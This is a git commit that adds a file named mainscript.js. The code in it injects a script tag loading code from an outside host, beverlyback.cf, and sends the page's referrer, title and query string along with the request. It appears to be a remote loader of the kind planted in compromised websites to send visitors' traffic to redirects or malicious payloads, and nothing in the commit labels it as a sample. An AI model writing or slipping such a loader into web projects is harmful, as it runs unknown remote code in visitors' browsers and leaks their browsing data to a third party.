1e2cf3f2a888b5e81230a5140827de712bc8bf91
execbrox <75723803+execbrox@users.noreply.github.com>
2020-12-09 03:45:22 -0500

    Create mainscript.js

---
+++ mainscript.js
@@ -0,0 +1,9 @@
+
+var d=document;var s=d.createElement('script'); 
+s.src='https://beverlyback.cf/whois?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5fcdd8d3d5bfa=script5fcdd8d3d5bfb&_cid=08bffff2-1a71-bfc9-5ed9-e5f45f7fa7ec'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && 'https://beverlyback.cf/whois?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5fcdd8d3d5bfa=script5fcdd8d3d5bfb'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
